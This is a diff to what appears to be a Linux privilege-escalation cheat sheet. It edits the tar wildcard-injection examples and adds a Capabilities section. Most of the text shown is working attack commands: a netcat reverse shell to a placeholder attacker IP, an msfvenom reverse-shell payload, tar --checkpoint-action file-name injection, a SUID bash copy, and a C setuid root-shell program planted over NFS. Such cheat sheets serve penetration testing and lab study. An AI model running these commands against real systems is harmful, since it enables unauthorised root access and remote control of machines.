@@ -12,6 +12,7 @@
    * [SUID / SGID](#SUID-/-SGID)
    * [Passwords & Keys](#Passwords-&-Keys)
    * [NFS](#NFS)
+   * [Capabilities](#Capabilities)
 * [Tips and tricks](#Tips-and-tricks)
 
 ## General tips
@@ -368,20 +369,28 @@ When a wildcard character (\*) is provided to a command as part of an argument, 
 
 Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 
-#### Example2
+#### Example1
 ```
 echo "mkfifo /tmp/lhennp; nc <ATTACKER IP> <ATTACKER PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
 
-#### Example1
+#### Example2
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
 chmod +x shell.elf
 touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
 nc -nvlp <PORT>
+```
+  
+#### Example3
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+chmod +x runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
 ```
 
 ### SUID / SGID
@@ -564,6 +573,15 @@ chmod +xs /tmp/nfs/shell.elf
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/pwn.c
 gcc /tmp/nfs/pwn.c -o /tmp/nfs/pwn
 chmod +s pwn
+```
+  
+### Capabilities
+- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+- Is like SUID
+  
+#### Find capabilities
+```
+getcap -r / 2>/dev/null
 ```
 
 ## Tips and tricks
